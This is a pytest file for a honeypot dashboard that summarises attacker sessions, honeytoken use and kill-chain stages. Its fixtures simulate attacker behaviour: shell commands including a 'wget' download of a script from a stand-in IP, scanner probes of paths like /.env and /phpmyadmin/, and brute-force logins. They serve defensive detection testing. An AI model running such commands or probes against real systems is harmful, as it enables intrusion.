"""Phase 2: the session story, technique chips and honeytoken badges, the banner, the kill chain."""

import re
from datetime import UTC, datetime, timedelta

import pytest
from fastapi.testclient import TestClient

from dashboard import data
from dashboard.app import create_app
from decoys.web.app import app as web_app
from qlure.correlate import store as correlate_store
from qlure.events import Event
from qlure.store import db, forwarder

PASSWORD = "test-password"
T0 = datetime(2026, 10, 9, 12, 0, 0, tzinfo=UTC)
IP = "203.0.113.9"


def _event(i, action, at=0, service="ssh", **fields):
    return Event(
        event_id=f"e{i}",
        ts=T0 + timedelta(seconds=at),
        service=service,
        src_ip=IP,
        session_id="s1",
        action=action,
        **fields,
    )


def _hit(rule_id, name, family):
    return {"rule_id": rule_id, "name": name, "family": family, "attack": [], "evidence": []}


# ---------- the story: a pure function, unit-tested on hand-built events ----------


def test_story_for_an_ssh_session_with_a_leaked_password():
    creds = {"username": "deploy", "password": "decoy-password"}
    commands = ["whoami", "id", "uname -a", "wget http://192.0.2.10/x.sh", "ls"]
    events = [
        _event(1, "connect", at=0),
        _event(2, "login_attempt", at=10, credential=creds, honeytoken_id="ht-ssh-001"),
        _event(3, "login_success", at=11, credential=creds, honeytoken_id="ht-ssh-001"),
        _event(4, "honeytoken_use", at=11, honeytoken_id="ht-ssh-001"),
    ] + [
        _event(5 + i, "command", at=at, request={"command": cmd})
        for i, (at, cmd) in enumerate(zip([20, 80, 140, 200, 245], commands, strict=True))
    ]
    assert data.session_story(events, []) == (
        f"From {IP} over 4 min: logged in over SSH with the leaked password"
        " and ran 5 commands including a download."
    )


def test_story_for_a_web_session_with_probes_and_logins():
    events = [
        _event(
            1,
            "http_request",
            at=0,
            service="web",
            request={"method": "GET", "path": "/wp-login.php"},
        ),
        _event(
            2,
            "http_request",
            at=5,
            service="web",
            request={"method": "GET", "path": "/phpmyadmin/"},
        ),
        _event(
            3, "http_request", at=10, service="web", request={"method": "GET", "path": "/backup/x"}
        ),
        _event(
            4,
            "login_attempt",
            at=12,
            service="web",
            credential={"username": "ops", "password": "a"},
        ),
        _event(
            5,
            "login_attempt",
            at=14,
            service="web",
            credential={"username": "ops", "password": "b"},
        ),
    ]
    hits = [_hit("R2", "Path enumeration", "recon")]
    assert data.session_story(events, hits) == (
        f"From {IP} over under a minute: probed 3 scanner paths and tried 2 logins."
    )


def test_story_reads_a_honeytoken_file_and_names_the_token():
    events = [
        _event(
            1,
            "file_read",
            at=0,
            service="web",
            request={"method": "GET", "path": "/.env"},
            honeytoken_id="ht-aws-001",
        ),
    ]
    assert data.session_story(events, [_hit("R9", "Sensitive file access", "misuse")]) == (
        f"From {IP} over under a minute: read /.env (honeytoken ht-aws-001)."
    )


def test_story_says_requested_when_no_recon_rule_fired():
    events = [
        _event(1, "http_request", at=0, service="web", request={"method": "GET", "path": "/a"}),
        _event(2, "http_request", at=1, service="web", request={"method": "GET", "path": "/b"}),
    ]
    assert "requested 2 paths" in data.session_story(events, [])


def test_story_for_a_connection_with_nothing_else():
    events = [_event(1, "connect", at=0)]
    assert data.session_story(events, []) == (
        f"From {IP} over under a minute: only connection events were recorded."
    )


def test_story_for_an_empty_session():
    assert data.session_story([], []) == "No events were recorded for this session."


def test_story_is_deterministic_and_ignores_input_order():
    events = [
        _event(
            1, "login_attempt", at=3, service="web", credential={"username": "a", "password": "b"}
        ),
        _event(2, "http_request", at=0, service="web", request={"method": "GET", "path": "/x"}),
    ]
    hits = [_hit("R2", "Path enumeration", "recon")]
    first = data.session_story(events, hits)
    assert data.session_story(list(reversed(events)), hits) == first
    assert data.session_story(events, hits) == first


# ---------- the pages, driven over HTTP on events the real decoys logged ----------


def _visit(ip, agent, paths, logins=0):
    client = TestClient(web_app, client=(ip, 40404))
    client.headers["user-agent"] = agent
    for path in paths:
        client.get(path)
    for i in range(logins):
        client.post("/login", data={"username": "ops", "password": f"guess-{i}"})


def _populate(tmp_path, log_dir, monkeypatch, visits):
    monkeypatch.setenv("QLURE_SETTINGS", str(tmp_path / "settings.json"))
    monkeypatch.setenv("QLURE_DASHBOARD_PASSWORD", PASSWORD)
    load_config = __import__("qlure.correlate.rules", fromlist=["load_config"]).load_config
    load_config.cache_clear()
    for visit in visits:
        _visit(*visit)
    conn = db.connect(tmp_path / "qlure.db")
    forwarder.forward_once(conn, log_dir)
    correlate_store.run(conn)
    yield {"db": tmp_path / "qlure.db", "logs": log_dir, "conn": conn}
    load_config.cache_clear()


ATTACKER = (
    "198.51.100.77",
    "Nikto/2.5.0",
    ["/wp-login.php", "/phpmyadmin/", "/backup/config.bak"],
    6,
)
HONEY_READER = (IP, "curl/8.5.0", ["/.env"], 0)
BRUTE = ("198.51.100.90", "Mozilla/5.0 Firefox/131.0", ["/login"], 6)


@pytest.fixture
def honey_env(tmp_path, log_dir, monkeypatch):
    # ATTACKER's /backup/config.bak read is a planted file too, so this data has honeytokens.
    yield from _populate(tmp_path, log_dir, monkeypatch, [ATTACKER, HONEY_READER])


@pytest.fixture
def brute_env(tmp_path, log_dir, monkeypatch):
    yield from _populate(tmp_path, log_dir, monkeypatch, [BRUTE])


def _login(app):
    client = TestClient(app, base_url="http://testserver")
    assert (
        client.post("/login", data={"password": PASSWORD}, follow_redirects=False).status_code
        == 303
    )
    return client


@pytest.fixture
def client(honey_env):
    return _login(create_app(honey_env["db"], honey_env["logs"]))


def _banner_session(env):
    return data.honeytoken_banner(env["conn"])["session_id"]


def _session_of(env, ip):
    return next(r["session_id"] for r in data.list_findings(env["conn"], {}) if r["src_ip"] == ip)


def test_sessions_list_has_technique_chips_and_a_honeytoken_badge(client):
    html = client.get("/").text
    assert "ATT&amp;CK T1110.001" in html
    assert re.search(r"ATT&amp;CK T\d", html)
    assert 'class="chip bad honeytoken-badge"' in html


def test_banner_names_the_token_and_links_to_its_session(honey_env, client):
    html = client.get("/").text
    sid = _banner_session(honey_env)
    assert 'class="callout warn honeytoken-banner"' in html
    assert "was used by" in html
    assert f'href="/session/{sid}"' in html


def test_no_banner_and_no_badge_without_a_honeytoken(brute_env):
    client = _login(create_app(brute_env["db"], brute_env["logs"]))
    html = client.get("/").text
    assert "honeytoken-banner" not in html
    assert "honeytoken-badge" not in html
    assert "ATT&amp;CK T1110.001" in html


def test_session_page_has_the_story_at_the_top_and_the_banner(honey_env, client):
    sid = _session_of(honey_env, IP)
    detail = data.session_detail(honey_env["conn"], sid)
    html = client.get(f"/session/{sid}").text
    assert detail["story"] in html
    assert "read /.env (honeytoken ht-aws-001)" in detail["story"]
    assert html.index('id="story-h"') < html.index('class="hero"')
    assert "honeytoken-banner" in html


def test_session_without_a_honeytoken_has_no_banner(brute_env):
    client = _login(create_app(brute_env["db"], brute_env["logs"]))
    sid = data.list_findings(brute_env["conn"], {})[0]["session_id"]
    html = client.get(f"/session/{sid}").text
    assert 'id="story-h"' in html
    assert "honeytoken-banner" not in html


def test_kill_chain_strip_shows_every_stage_reached(honey_env, client):
    actor = data.session_detail(honey_env["conn"], _session_of(honey_env, ATTACKER[0]))["actor_id"]
    html = client.get(f"/actor/{actor}").text
    stages = dict(re.findall(r'<li class="stage stage-(\w+)( is-dim)?">', html))
    assert set(stages) == {"recon", "credential", "misuse"}
    assert all(dim == "" for dim in stages.values())
    assert "Not reached" not in html


def test_kill_chain_strip_dims_the_stages_a_brute_forcer_never_reached(brute_env):
    client = _login(create_app(brute_env["db"], brute_env["logs"]))
    actor = data.list_findings(brute_env["conn"], {})[0]["actor_id"]
    html = client.get(f"/actor/{actor}").text
    stages = dict(re.findall(r'<li class="stage stage-(\w+)( is-dim)?">', html))
    assert stages["credential"] == ""
    assert stages["recon"] == " is-dim" and stages["misuse"] == " is-dim"
    assert html.count("Not reached") == 2


def test_kill_chain_times_are_the_first_event_of_each_stage(honey_env):
    actor = data.session_detail(honey_env["conn"], _session_of(honey_env, ATTACKER[0]))["actor_id"]
    chain = {s["stage"]: s for s in data.actor_detail(honey_env["conn"], actor)["kill_chain"]}
    assert all(chain[s]["reached"] for s in ("recon", "credential", "misuse"))
    assert all(chain[s]["first"] for s in ("recon", "credential", "misuse"))


def test_empty_store_shows_the_seed_hint(tmp_path, monkeypatch):
    monkeypatch.setenv("QLURE_SETTINGS", str(tmp_path / "settings.json"))
    monkeypatch.setenv("QLURE_DASHBOARD_PASSWORD", PASSWORD)
    app = create_app(tmp_path / "empty.db", tmp_path / "logs")
    html = _login(app).get("/").text
    assert (
        "No data yet. Run python tools/seed_demo.py --db data/demo.db to load sample data, "
        "or start the decoys (see docs/DEMO.md)."
    ) in html
    assert "<table" not in html
    assert "honeytoken-banner" not in html
